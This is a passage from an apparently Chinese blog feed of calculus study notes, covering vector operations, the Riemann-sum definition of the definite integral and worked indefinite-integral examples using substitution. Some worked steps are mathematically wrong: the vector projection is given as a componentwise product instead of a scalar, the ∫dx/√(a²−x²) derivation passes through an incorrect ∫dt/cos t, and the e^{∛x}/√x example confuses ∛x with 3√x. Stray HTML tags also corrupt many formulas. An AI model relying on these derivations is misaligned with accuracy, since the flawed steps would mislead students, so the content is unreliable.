\pm(\mathrm{x}</em>{2}, \mathrm{y}<em>{2},\mathrm{z}</em>{2})  =(\mathrm{x}<em>{1} \pm \mathrm{x}</em>{2}, \mathrm{y}<em>{1} \pm \mathrm{y}</em>{2},\mathrm{z}<em>{1} \pm \mathrm{z}</em>{2})$</td></tr><tr><td>乘法</td><td>$\vec{\mathrm{a}} \cdot \vec{\mathrm{b}}=\vec{\mathrm{b}} \cdot \vec{\mathrm{a}}\{\displaystyle \lambda ({\vec {a}}+{\vec {b}})=\lambda {\vec {a}}+\lambda {\vec {b}}}\{\vec{a} ({\vec {b}}+{\vec {c}})=\vec{a} {\vec {b}}+\vec{a} {\vec {c}}}$</td><td>坐标带进去即可，同加减法带入方式</td><td>坐标带进去即可，同加减法带入方式</td></tr><tr><td>$\vec{a}$单位向量</td><td>${\vec e_{\vec{a}}}=\frac{\vec{a} }{\mid \vec{a}\mid }$</td><td>$\frac{(x_1,y_1)}{\sqrt{x_1^2+y_1^2} }=(\frac{x_1}{\sqrt{x_1^2+y_1^2}},\frac{y_1}{\sqrt{x_1^2+y_1^2}})$</td><td>$\frac{(x_1,y_1,z_1)}{\sqrt{x_1^2+y_1^2+z_1^2} }=(\frac{x_1}{\sqrt{x_1^2+y_1^2+z_1^2}},\frac{y_1}{\sqrt{x_1^2+y_1^2+z_1^2}},\frac{z_1}{\sqrt{x_1^2+y_1^2+z_1^2}})$</td></tr><tr><td>$\vec{a}\times \vec{b}$单位向量</td><td>${\vec e_{\vec{a}\times \vec{b}}}=\frac{\vec{a}\times \vec{b} }{\mid {\vec{a}\times \vec{b}}\mid }$</td><td>运算方式如上</td><td>运算方式如上</td></tr><tr><td>$\vec{b}$在$\vec{a}$上的投影</td><td>$prj<em>{\vec{a}}\vec{b}=\vec{e</em>{\vec{a}}}\cdot \vec{b}=\vec{b}\cdot \vec{e_{\vec{a}}}$</td><td>$(x_2,y_2)\cdot\frac{(x_1,y_1)}{\sqrt{x_1^2+y_1^2} }=(x_2\cdot \frac{x_1}{\sqrt{x_1^2+y_1^2}},y_2\cdot \frac{y_1}{\sqrt{x_1^2+y_1^2}})$</td><td>运算方式如左</td></tr></tbody></table></div>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>定积分</title>
    <link href="https://www.ascotbe.com/2023/03/10/FurtherMathematics_0x08/"/>
    <id>https://www.ascotbe.com/2023/03/10/FurtherMathematics_0x08/</id>
    <published>2023-03-10T15:58:53.000Z</published>
    <updated>2023-03-13T05:12:22.748Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_8.jpg" style="zoom:50%;" /></p><h3 id="定积分"><a href="#定积分" class="headerlink" title="定积分"></a>定积分</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>设函数$f(x)$在$[a,b]$上有界，在$[a,b]$中任意插入若干个分点：</p><p>$\begin{align}a=x<em>0 &lt; x_1 &lt; \cdots &lt; x</em>{i-1} &lt; x<em>i &lt; \cdots &lt; x</em>{n-1} &lt; x_n=b\end{align}$</p><p>把$[a,b]$分成$n$个小区间：</p><p>$\begin{align}[x<em>0,x_1],\ \cdots,[x</em>{i-1},x<em>{i}],\ \cdots,\ [x</em>{n-1},x_n]\end{align}$</p><p>各个小区间的长度依次为：</p><p>$\begin{align}\Delta x<em>1=x_1-x_0,\ \cdots,\ \Delta x_i=x</em>{i}-x<em>{i-1},\cdots,\ \Delta x_n=x_n-x</em>{n-1}\end{align}$</p><p>在每个小区间$[x<em>{i-1},x_i]$上任取一点$\xi_i(x</em>{i-1}\le\xi_i\le x_i)$，作函数值$f(\xi_i)$与小区间长度$\Delta x_i$的乘积$f(\xi_i)\Delta x_i(i=1,2,\cdots,n)$，并作出和：</p><p>$\begin{align}S=\sum_{i=1}^{n}f(\xi_i)\Delta x_i\end{align}$</p><p>记$\lambda=\max{\Delta x<em>1,\Delta x_2,…,\Delta x_n}$，如果当$\lambda\to 0$时，这和的极限总存在，且与闭区间$[a,b]$的分法及点$\xi_i$的取法无关，那么称这个极限$I$为函数$f(x)$在区间$[a,b]$上的<strong>定积分</strong>（Definite integral）（简称<strong>积分</strong>），记作$\int</em>{a}^{b}f(x)dx$，即：</p><p>$\begin{align}\int<em>{a}^{b} f(x) \mathrm{~d} x=I=\lim </em>{\lambda\to 0} \sum<em>{i=1}^{n} f\left(\xi</em>{i}\right) \Delta x_{i}\end{align}$</p><p>其中$f(x)$叫做<strong>被积函数</strong>，$f(x) \mathrm{~d} x$叫做<strong>被积表达式</strong>，$x$叫做<strong>积分变量</strong>，$a$叫做<strong>积分下限</strong>，$b$叫做<strong>积分上限</strong>，$[a,b]$叫做<strong>积分区间</strong>。</p><p>如果函数$y=f(x)$在区间$[a,b]$上的定积分存在，那么就说$y=f(x)$在区间$[a,b]$上可积 。</p><p>上述定义涉及到的符号较多，这里用下图来总结一下</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/46.svg" alt=""></p><p>除了符号外，该定义也格外复杂，可以说是本课程中最复杂的定义，下面来仔细解释下</p><h4 id="黎曼和"><a href="#黎曼和" class="headerlink" title="黎曼和"></a>黎曼和</h4><p>如下图所示，$y=f(x)$为在$[a,b]$上的有界函数。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/47.png" alt="1"></p><p>在$[a,b]$中任意插入若干个分点：</p><p>$\begin{align}a=x<em>0 &lt; x_1 &lt; \cdots &lt; x</em>{i-1} &lt; x<em>i &lt; \cdots &lt; x</em>{n-1} &lt; x_n=b\end{align}$</p><p>这些分点把$[a,b]$分成$n$个小区间，每个小区间的长度为$\Delta x_i$，如下图所示（为了展示方便，下图中的分点都是均匀插入的)。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/48.gif" alt="48"></p><p>在每个小区间$[x<em>{i-1},x_i]$上任取一点$\xi_i(x</em>{i-1}\le\xi_i\le x_i)$，该点对应的函数值为$f(\xi_i)$，如下图所示。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/49.png" alt="1"></p><p>以各个小区间$[x_{i-1},x_i]$作底，$f(\xi_i)$作高，可以得到$n$个小矩形，如下图所示。容易知道每个小矩形的面积都是$f(\xi_i)\Delta x_i$。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/50.png" alt="1"></p><p>值得注意的是，上述的小区间$[x<em>{i-1},x_i]$是可以任意划分的，$\xi_i$点也是在小区间$[x</em>{i-1},x_i]$上任意选取的，所以小矩形是可以不断变化的，如下图所示。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/51.gif" alt="51"></p><p>如果将这些可以变化的小矩形的面积加起来，得到的就是定义中提到的和$S=\sum_{i=1}^{n}f(\xi_i)\Delta x_i$，该和也称为黎曼和（Riemann sum)，以其发明者德国数学家黎曼命名。</p><h4 id="黎曼和的极限就是定积分"><a href="#黎曼和的极限就是定积分" class="headerlink" title="黎曼和的极限就是定积分"></a>黎曼和的极限就是定积分</h4><p>如果恰当地（而不是任意地）在$[a,b]$中插入更多的分点，那么就可以看到小矩形在不断增多，不断逼近以$y=f(x)$为曲边的曲边梯形，如下图所示。上述操作用代数来表示就是，记$\lambda=\max{\Delta x_1,\Delta x_2,…,\Delta x_n}$，不断缩小$\lambda$。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/52.gif" alt="52"></p><p>随着$\lambda$的缩小，如果最终这些小矩形的和存在极限，该极限就是定积分，即：</p><p>$\begin{align}\int<em>{a}^{b} f(x) \mathrm{~d} x=I=\lim </em>{\lambda\to 0} \sum<em>{i=1}^{n} f\left(\xi</em>{i}\right) \Delta x_{i}\end{align}$</p><h3 id="知识前导"><a href="#知识前导" class="headerlink" title="知识前导"></a>知识前导</h3><p><del>他妈的初中的数学都忘完了</del></p><p>一元二次方程$a x^{2}+b x+c=0 \quad(a \neq 0)$</p><p>解的情况由$b^{2}-4 a c$决定：</p><ol><li>当$b^{2}-4 a c&gt;0$时，方程有两个不相等的实数根</li><li>当$b^{2}-4 a c=0$时，方程有两个 相等的实数根</li><li>当$b^{2}-4 a c&lt;0$时，方程没有实数根</li></ol><p>求解公式如下：</p><p>$\begin{align}x=\frac{-b\pm\sqrt{b^2-4ac}}{2a}\end{align}$</p><h3 id="定积分的应用"><a href="#定积分的应用" class="headerlink" title="定积分的应用"></a>定积分的应用</h3><p>站坑</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>不定积分</title>
    <link href="https://www.ascotbe.com/2023/03/05/FurtherMathematics_0x07/"/>
    <id>https://www.ascotbe.com/2023/03/05/FurtherMathematics_0x07/</id>
    <published>2023-03-05T15:58:53.000Z</published>
    <updated>2023-03-13T06:21:39.538Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_7.gif" alt=""></p><h3 id="原函数与不定积分"><a href="#原函数与不定积分" class="headerlink" title="原函数与不定积分"></a>原函数与不定积分</h3><p>定理就是一句话：连续函数一定有原函数</p><p>$\begin{align}<br>\int f(x)\mathrm{~d}x<br>\end{align}$</p><p>符号$\int$成为<strong>积分号</strong>，$f(x)$称为<strong>被积函数</strong>，$f(x)\mathrm{~d}x$称为<strong>被积表达式</strong>，$x$称为<strong>积分变量</strong></p><h3 id="基本积分表"><a href="#基本积分表" class="headerlink" title="基本积分表"></a>基本积分表</h3><div class="table-container"><table><thead><tr><th>表格内容</th></tr></thead><tbody><tr><td>$\int k \mathrm{~d} x=k x+C \quad$</td></tr><tr><td>$\int x^{\mu} \mathrm{~d} x=\frac{x^{\mu+1}}{\mu+1}+C \quad(\mu \neq-1)$</td></tr><tr><td>$\int \frac{\mathrm{~d} x}{x}=\ln \mid x\mid+C$</td></tr><tr><td>$\int \frac{\mathrm{~d} x}{1+x^{2}}=\arctan x+C$</td></tr><tr><td>$\int \frac{\mathrm{~d} x}{\sqrt{1-x^{2}}}=\arcsin x+C$</td></tr><tr><td>$\int \cos x \mathrm{~d} x=\sin x+C$</td></tr><tr><td>$\int \sin x \mathrm{~d} x=-\cos x+C$</td></tr><tr><td>$\int \frac{\mathrm{~d} x}{\cos ^{2} x}=\int \sec ^{2} x \mathrm{~d} x=\tan x+C$</td></tr><tr><td>$\int \frac{\mathrm{~d} x}{\sin ^{2} x}=\int \csc ^{2} x \mathrm{~d} x=-\cot x+C$</td></tr><tr><td>$\int \sec x \tan x \mathrm{~d} x=\sec x+C$</td></tr><tr><td>$\int \csc x \cot x \mathrm{~d} x=-\csc x+C$</td></tr><tr><td>$\int \mathrm{e}^{x} \mathrm{~d} x=\mathrm{e}^{x}+C$</td></tr><tr><td>$\int a^{x} \mathrm{~d} x=\frac{a^x}{\ln a}+C$</td></tr></tbody></table></div><h3 id="符号解释"><a href="#符号解释" class="headerlink" title="符号解释"></a>符号解释</h3><p>高阶平方根</p><p>$\begin{align}{\sqrt[{3}]{x}}&amp;=x^{1/3}\{\sqrt[{4}]{x}}&amp;=x^{1/4}\&amp;\vdots \{\sqrt[{n}]{x}}&amp;=x^{1/n}\end{align}$</p><h3 id="直接积分法"><a href="#直接积分法" class="headerlink" title="直接积分法"></a>直接积分法</h3><div class="note success modern"><p>利用基本积分公式+积分性质</p></div><p>例题：$\int \frac{1}{\sqrt{x}} \mathrm{~d} x$</p><p>解：</p><p>$\begin{align} &amp;\int \frac{1}{\sqrt{x}} \mathrm{~d} x \=&amp; \int x^{-\frac{1}{2}} \mathrm{~d} x \=&amp;\frac{1}{-\frac{1}{2}+1}x^{-\frac{1}{2}+1}+C\=&amp;2\sqrt{x}+C\end{align}$</p><hr><p>例题：$\int \frac{1}{x\cdot \sqrt[3]{x}} \mathrm{~d} x$</p><p>解：</p><p>$\begin{align}&amp;\int \frac{1}{x\cdot \sqrt[3]{x}} \mathrm{~d} x \=&amp;\int x^{-\frac{4}{3}}\mathrm{~d} x\=&amp;\frac{1}{-\frac{4}{3}+1}x^{-\frac{4}{3}+1}+C\=&amp;-3x^{-\frac{1}{3}}+C\end{align}$</p><hr><p>例题：$\int {\sqrt{x}\cdot(x^2-5)}\mathrm{~d} x$</p><p>解：</p><p>$\begin{align}&amp;\int {\sqrt{x}\cdot(x^2-5)}\mathrm{~d} x \=&amp; \int (x^{\frac{5}{2}}-5x^{\frac{1}{2}})\mathrm{~d} x \=&amp;\int x^{\frac{5}{2}}\mathrm{~d} x-5\int x^{\frac{1}{2}}\mathrm{~d} x \=&amp;\frac{1}{\frac{5}{2}+1}x^{\frac{5}{2}+1}-5\cdot \frac{1}{\frac{1}{2}+1}x^{\frac{1}{2}+1}+C \=&amp;\frac{2}{7}x^{\frac{7}{2}}-\frac{10}{3}x^{\frac{3}{2}}+C\end{align}$</p><hr><p>例题：$\int\frac{(x-1)^3}{x^2}\mathrm{~d}x$</p><p>解：由于$(a-b)^3=a^3-3a^2b+3ab^2-b^3$，所有下面公式可以转换成</p><p>$\begin{align} &amp; \int\frac{(x-1)^3}{x^2}\mathrm{~d}x \=&amp; \int\frac{x^3-3x^2+3x-1}{x^2}\mathrm{~d}x\=&amp;\int x\mathrm{~d}x-3\int \mathrm{~d}x+3\int \frac{1}{x}\mathrm{~d}x-\int \frac{1}{x^2}\mathrm{~d}x\=&amp;\frac{x^2}{2}-3x+3\ln \mid x\mid+\frac{1}{x}+C\end{align}$</p><hr><p>例题：$\int(e^x-3\sin x+10^x)\mathrm{~d}x$</p><p>解：</p><p>$\begin{align} &amp;\int(e^x-3\sin x+10^x)\mathrm{~d}x \=&amp;\int e^x\mathrm{~d}x-3\int \sin x \mathrm{~d}x+\int 10^x \mathrm{~d}x\=&amp;e^x+3\cos x +\frac{10^x}{\ln 10}+C \end{align}$</p><hr><p>例题：$\int 2^xe^x\mathrm{~d}x$</p><p>解：</p><p>$\begin{align} &amp;\int 2^xe^x\mathrm{~d}x\=&amp;\int(2e)^x\mathrm{~d}x \=&amp;\frac{(2e)^x}{\ln2e} +C\end{align}$</p><hr><p>例题：$\int \frac{1+x+x^2}{x(1+x^2)}\mathrm{~d}x$</p><p>解：</p><p>$\begin{align} &amp; \int \frac{1+x+x^2}{x(1+x^2)}\mathrm{~d}x\=&amp;\int \frac{x+(1+x^2)}{x(1+x^2)}\mathrm{~d}x\=&amp;\int \frac{\mathrm{~d}x}{1+x^2}+\int \frac{\mathrm{~d}x}{x}\=&amp;\arctan x +\ln \mid x \mid +C \end{align}$</p><hr><p>例题：$\int \frac{x^4}{1+x^2}\mathrm{~d}x$</p><p>解：</p><p>$\begin{align}&amp;\int \frac{x^4}{1+x^2}\mathrm{~d}x\=&amp;\int \frac{x^4-1+1}{1+x^2}\mathrm{~d}x\=&amp;\int \frac{(x^2-1)(x^2+1)}{1+x^2}\mathrm{~d}x+\int \frac{1}{1+x^2}\mathrm{~d}x\=&amp;\int(x^2-1)\mathrm{~d}x+\arctan x\=&amp;\frac{x^3}{3}-x+\arctan x +C\end{align}$</p><hr><p>例题：$\int \tan^2x\mathrm{~d}x$</p><p>$\begin{align}&amp;\int \tan^2x \mathrm{~d}x \=&amp;\int(\sec^2x-1)\mathrm{~d}x\=&amp;\int \sec^2x\mathrm{~d}x-\int \mathrm{~d}x\=&amp;\tan x-x+C\end{align}$</p><h3 id="换元法"><a href="#换元法" class="headerlink" title="换元法"></a>换元法</h3><h4 id="第一类换元法（凑微分法）"><a href="#第一类换元法（凑微分法）" class="headerlink" title="第一类换元法（凑微分法）"></a>第一类换元法（凑微分法）</h4><div class="table-container"><table><thead><tr><th>常用的凑微分公式</th></tr></thead><tbody><tr><td>$\mathrm{~d}x=\frac{1}{a} \mathrm{~d}(a x+b)\quad  (a \neq 0)$</td></tr><tr><td>$x \mathrm{~d}x=\frac{1}{2} \mathrm{~d}\left(x^{2}\right)$</td></tr><tr><td>$\frac{1}{\sqrt{x}} \mathrm{~d}x=2 \mathrm{~d}\sqrt{x}$</td></tr><tr><td>$\frac{1}{x^{2}} \mathrm{~d}x=-\mathrm{~d}\left(\frac{1}{x}\right)$</td></tr><tr><td>$\sin x \mathrm{~d}x =-\mathrm{~d}(\cos x)$</td></tr><tr><td>$\cos x \mathrm{~d}x=\mathrm{~d} \sin x$</td></tr><tr><td>$\sec ^{2} x \mathrm{~d}x=\mathrm{~d}\tan x$</td></tr><tr><td>$\csc ^{2} x \mathrm{~d}x=-\mathrm{~d}\cot x$</td></tr><tr><td>$\frac{1}{1+x^{2}} \mathrm{~d}x=\mathrm{~d}\arctan x$</td></tr><tr><td>$\frac{1}{x} \mathrm{~d}x=\mathrm{~d} \ln x$</td></tr><tr><td>$e^{x} \mathrm{~d}x=\mathrm{~d} e^{x}$</td></tr></tbody></table></div><p>当我们计算$\int \sin^m x\cos^n x\mathrm{~d}x$时，一般可考虑下列方法：</p><ol><li>当$m,n$中有一个为奇数时，分离一个$\sin x$（或$\cos x$）凑微分，再将被积表达式的其它部分表达为$\cos x$( 或$\sin x$) 的函数，转化为$\cos x$或$\sin x$的多项式的积分来算。</li><li>当$m,n$均为偶数时，可利用半角公式$\sin ^{2} x=\frac{1-\cos 2 x}{2}$，$\cos ^{2} x=\frac{1+\cos 2 x}{2}$降次化简后计算。</li></ol><p>计算$\int \sin m x \cos n x d x$，$\int \sin m x \sin n x d x$，$\int \cos m x \cos n x d x$，若$m \neq n$时，可运用三角函数的积化和差公式：</p><p>$\begin{align}<br>&amp;\sin \alpha \cos \beta=\frac{1}{2}[\sin (\alpha+\beta)+\sin (\alpha-\beta)] \<br>&amp;\cos \alpha \cos \beta=\frac{1}{2}[\cos (\alpha+\beta)+\cos (\alpha-\beta)] \<br>&amp;\sin \alpha \sin \beta=-\frac{1}{2}[\cos (\alpha+\beta)-\cos (\alpha-\beta)]<br>\end{align}$</p><p>再分项积分</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>例题：求$\int 2 \cos 2 x \mathrm{~d} x$</p><p>解：被积函数中，$\cos 2 x$是一个由$\cos 2 x=\cos u, u=2 x$复合而成的复合函数，常数因子恰好是中间变量$u$的导数。因此，作变换$u=2 x$便有</p><p>$\begin{align} \int 2 \cos 2 x \mathrm{~d} x &amp; = \int \cos 2 x \cdot 2 \mathrm{~d} x = \int \cos 2 x \cdot(2 x)^{\prime} \mathrm{~d} x \ &amp;= \int \cos u \mathrm{~d} u=\sin u+C<br>\end{align}$</p><p>再以$u=2x$代入即可得到</p><p>$\begin{align}<br>\int 2\cos 2x \mathrm{~d} u =  \sin 2x+C<br>\end{align}$</p><hr><p>例题：求$\int \frac{1}{3+2 x} \mathrm{~d} x$</p><p>解：被积函数$\frac{1}{3+2 x}=\frac{1}{u}, u=3+2 x$。这里缺少$\frac{\mathrm{~d} u}{\mathrm{~d} x}=2$这样一个因子，但由于$\frac{\mathrm{~d} u}{\mathrm{~d} x}$是个常数，故可改变系数凑出这个因子：$\frac{1}{3+2 x}=\frac{1}{2} \cdot \frac{1}{3+2 x} \cdot 2=\frac{1}{2} \cdot \frac{1}{3+2 x}(3+2 x)^{\prime}$</p><p>从而令$u=3+2 x$便有</p><p>$\begin{align}<br>\int \frac{1}{3+2 x} \mathrm{~d} x &amp; =\int \frac{1}{2} \cdot \frac{1}{3+2 x}(3+2 x)^{\prime} \mathrm{~d} x=\int \frac{1}{2} \cdot \frac{1}{u} \mathrm{~d} u \<br>&amp; =\frac{1}{2} \ln |u|+C=\frac{1}{2} \ln |3+2 x|+C<br>\end{align}$</p><p>一般地，对于积分$\int f(a x+b) \mathrm{~d} x \quad (a \neq 0)$，总可作变换$u=a x+b$，把它化为</p><p>$\int f(a x+b) \mathrm{~d} x=\int \frac{1}{a} f(a x+b) \mathrm{~d}(a x+b)=\frac{1}{a}\left[\int f(u) \mathrm{~d} u\right]_{u=a x+b}$</p><hr><p>例题：求$\int \frac{x^{2}}{(x+2)^{3}} \mathrm{~d} x$</p><p>解：令$u=x+2$，则$x=u-2, \mathrm{~d} x=\mathrm{~d} u$于是</p><p>$\begin{align}<br>\int \frac{x^{2}}{(x+2)^{3}} \mathrm{~d} x &amp; =\int \frac{(u-2)^{2}}{u^{3}} \mathrm{~d} u=\int\left(u^{2}-4 u+4\right) u^{-3} \mathrm{~d} u \<br>&amp; =\int\left(u^{-1}-4 u^{-2}+4 u^{-3}\right) \mathrm{~d} u \<br>&amp; =\ln |u|+4 u^{-1}-2 u^{-2}+C \<br>&amp; =\ln |x+2|+\frac{4}{x+2}-\frac{2}{(x+2)^{2}}+C<br>\end{align}$</p><hr><p>例题：求$\int 2 x \mathrm{e}^{x^{2}} \mathrm{~d} x$</p><p>解：被积函数中的一个因子为$\mathrm{e}^{x^{2}}=\mathrm{e}^{u}, u=x^{2}$，剩下的因子$2 x$恰好是中间变量$u=x^{2}$的导数，于是有</p><p>$\begin{align}\int 2 x \mathrm{e}^{x^{2}} \mathrm{~d} x=\int \mathrm{e}^{x^{2}} \mathrm{~d}\left(x^{2}\right)=\int \mathrm{e}^{u} \mathrm{~d} u=\mathrm{e}^{u}+C=\mathrm{e}^{x^{2}}+C \end{align}$</p><hr><p>例题：求$\int x\sqrt{1-x^2}  \mathrm{~d} x$</p><p>解：设$u=1-x^{2}$，则$\mathrm{~d} u=-2 x \mathrm{~d} x$，即$-\frac{1}{2} \mathrm{~d} u=x \mathrm{~d} x$，因此</p><p>$\begin{align}<br>\int x \sqrt{1-x^{2}} \mathrm{~d} x &amp; =\int u^{\frac{1}{2}} \cdot\left(-\frac{1}{2}\right) \mathrm{~d} u=-\frac{1}{2} \cdot\frac{3}{2}{u^{\frac{3}{2}}}+C \<br>&amp; =-\frac{1}{3} u^{\frac{3}{2}}+C=-\frac{1}{3}\left(1-x^{2}\right)^{\frac{3}{2}}+C .<br>\end{align}$</p><hr><p>例题：求$\int \frac{1}{a^{2}+x^{2}} \mathrm{~d} x \quad(a \neq 0)$</p><p>解：</p><p>$\begin{align}\int \frac{1}{a^{2}+x^{2}} \mathrm{~d} x &amp;=\int \frac{1}{a^{2}} \cdot \frac{1}{1+\left(\frac{x}{a}\right)^{2}} \mathrm{~d} x \ &amp;=\frac{1}{a} \int \frac{1}{1+\left(\frac{x}{a}\right)^{2}} \mathrm{~d} \frac{x}{a}=\frac{1}{a} \arctan \frac{x}{a}+C \end{align}$</p><p>在上例中，我们实际上已经用了变量代换$u=\frac{x}{a}$，并在求出积分$\frac{1}{a} \int \frac{1}{1+u^{2}} \mathrm{~d} u$之 后，代回了原积分变量$x$，只是没有把这些步骤写出来而已。</p><hr><p>例题：求$\int \frac{\mathrm{~d} x}{\sqrt{a^{2}-x^{2}}} \quad(a&gt;0)$</p><p>解：这是一道典型的反三角函数求导题目，我们可以考虑使用反三角函数来求解。</p><p>令$x=a\sin t$，则有$\mathrm{~d}x=a\cos t\mathrm{~d}t$，代入原式中得到：</p><p>$\begin{align}\int \frac{\mathrm{~d}x}{\sqrt{a^{2}-x^{2}}}=\int \frac{a\cos t}{\sqrt{a^{2}-a^{2}\sin^{2}t}}\mathrm{~d}t=\int \frac{\mathrm{~d}t}{\cos t}\end{align}$</p><p>现在我们需要将积分式中的$\cos t$消去，我们可以使用三角恒等式$\cos^{2}t=1-\sin^{2}t$，将$\cos t$表示为$\sin t$的函数，得到：</p><p>$\begin{align}\int \frac{\mathrm{~d}t}{\cos t}=\int \frac{\mathrm{~d}t}{\sqrt{1-\sin^{2}t}}=\arcsin \frac{x}{a}+C\end{align}$</p><p>其中，$C$为常数，因此，原式的解为$\arcsin \frac{x}{a}+C$</p><hr><p>例题：求$\int \frac{1}{x^{2}-a^{2}} \mathrm{~d} x \quad(a \neq 0)$<br>解：由于$\frac{1}{x^{2}-a^{2}}=\frac{1}{2 a}\left(\frac{1}{x-a}-\frac{1}{x+a}\right)$所以</p><p>$\begin{align}<br>\int \frac{1}{x^{2}-a^{2}} \mathrm{~d} x &amp; =\frac{1}{2 a} \int\left(\frac{1}{x-a}-\frac{1}{x+a}\right) \mathrm{~d} x \<br>&amp; =\frac{1}{2 a}\left(\int \frac{1}{x-a} \mathrm{~d} x-\int \frac{1}{x+a} \mathrm{~d} x\right) \<br>&amp; =\frac{1}{2 a}\left[\int \frac{1}{x-a} \mathrm{~d}(x-a)-\int \frac{1}{x+a} \mathrm{~d}(x+a)\right]\ &amp;=\frac{1}{2 a}(\ln |x-a|-\ln |x+a|)+C  =\frac{1}{2 a} \ln \left|\frac{x-a}{x+a}\right|+C<br>\end{align}$</p><hr><p>例题：求$\int \frac{\mathrm{~d} x}{x(1+2 \ln x)}$</p><p>解：</p><p>$\begin{align}\int \frac{\mathrm{~d} x}{x(1+2 \ln x)}&amp;=\int \frac{\mathrm{~d}(\ln x)}{1+2 \ln x}\&amp;=\frac{1}{2} \int \frac{\mathrm{~d}(1+2 \ln x)}{1+2 \ln x}=\frac{1}{2} \ln |1+2 \ln x|+C\end{align}$</p><hr><p>例题：求$\int \frac{\mathrm{e}^{\sqrt[3]{x}}}{\sqrt{x}} \mathrm{~d} x$</p><p>解：由于$\mathrm{~d} \sqrt{x}=\frac{1}{2}\cdot \frac{\mathrm{~d} x}{\sqrt{x}}$，因此，</p><p>$\begin{align}\int \frac{\mathrm{e}^{3 \sqrt{x}}}{\sqrt{x}} \mathrm{~d} x=2 \int \mathrm{e}^{\sqrt[3]{x}} \mathrm{~d} \sqrt{x}=\frac{2}{3} \int \mathrm{e}^{\sqrt[3]{x}} \mathrm{~d}(3 \sqrt{x})=\frac{2}{3} \mathrm{e}^{\sqrt[3]{x}}+C\end{align}$</p><hr><p>例题：求$\int \sin ^{3} x \mathrm{~d} x$</p><p>解：</p><p>$\begin{align}\int \sin ^{3} x \mathrm{~d} x&amp;=\int \sin ^{2} x \sin x \mathrm{~d} x=-\int\left(1-\cos ^{2} x\right) \mathrm{~d}(\cos x) \&amp;=-\cos x+\frac{1}{3} \cos ^{3} x+C \end{align}$</p><hr><p>例题：求$\int \sin ^{2} x \cos ^{5} x \mathrm{~d} x$</p><p>解：</p><p>$\begin{align}<br>\int \sin ^{2} x \cos ^{5} x \mathrm{~d} x &amp; =\int \sin ^{2} x \cos ^{4} x \cos x \mathrm{~d} x \<br>&amp; =\int \sin ^{2} x\left(1-\sin ^{2} x\right)^{2} \mathrm{~d}(\sin x) \<br>&amp; =\int\left(\sin ^{2} x-2 \sin ^{4} x+\sin ^{6} x\right) \mathrm{~d}(\sin x) \<br>&amp; =\frac{1}{3} \sin ^{3} x-\frac{2}{5} \sin ^{5} x+\frac{1}{7} \sin ^{7} x+C<br>\end{align}$</p><hr><p>求$\int \cos 3 x \cos 2 x \mathrm{~d} x$</p><p>解：利用三角函数的积化和差公式$\cos A \cos B=\frac{1}{2}[\cos (A-B)+\cos (A+B)]$，得$\cos 3 x \cos 2 x=\frac{1}{2}(\cos x+\cos 5 x)$于是</p><p>$\begin{align}<br>\int \cos 3 x \cos 2 x \mathrm{~d} x &amp; =\frac{1}{2} \int(\cos x+\cos 5 x) \mathrm{~d} x \<br>&amp; =\frac{1}{2}\left(\int \cos x \mathrm{~d} x+\frac{1}{5} \int \cos 5 x \mathrm{~d}(5 x)\right) \<br>&amp; =\frac{1}{2} \sin x+\frac{1}{10} \sin 5 x+C<br>\end{align}$</p><h4 id="第二类换元法（去根号）"><a href="#第二类换元法（去根号）" class="headerlink" title="第二类换元法（去根号）"></a>第二类换元法（去根号）</h4><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><p>例题：求$\int \frac{1}{1+\sqrt{x}}\mathrm{~d} x$</p><p>解：令$t=\sqrt{x},x=t^2,\mathrm{~d} x=2t\mathrm{~d} t$</p><p>$\begin{align}\int \frac{1}{1+\sqrt{x}}\mathrm{~d} x &amp;=\int \frac{1}{1+t}2t\mathrm{~d} t\&amp;=2[\int 1\mathrm{~d} t-\int \frac{1}{1+t}\mathrm{~d} t]\&amp;=2[t-\ln\mid  1+t\mid]+C=2\sqrt{x}-2\ln(1+\sqrt{x})+C\end{align}$</p><hr><p>例题：求$\int x\sqrt{1-x^2}\mathrm{~d} x$</p><p>解：令$t=1-x^2,x^2=1-t,\mathrm{~d} t=-2x\mathrm{~d} x,\mathrm{~d} x=-\frac{\mathrm{~d} t}{2x}$</p><p>$\begin{align}\int x\sqrt{1-x^2}\mathrm{~d} x &amp;=\int x\sqrt{t}(\frac {\mathrm{~d} t}{2x})\&amp;=-\frac{1}{2}\int \sqrt{t}\mathrm{~d} t\&amp;=-\frac{1}{2}\cdot \frac{2}{3}t^{\frac{3}{2}}+C=-\frac{1}{3}t^{\frac{3}{2}}+C =-\frac{1}{3}(1-x^2)^{\frac{3}{2}}+C \end{align}$</p><hr><p>例题：求$\int \sqrt{a^{2}-x^{2}} \mathrm{~d} x \quad(a&gt;0)$</p><p>解：求这个积分的困难在于有根式$\sqrt{a^{2}-x^{2}}$，但我们可以利用三角公式$\sin ^{2} t+\cos ^{2} t=1$<br>来化去根式。</p><p>设$x=a \sin 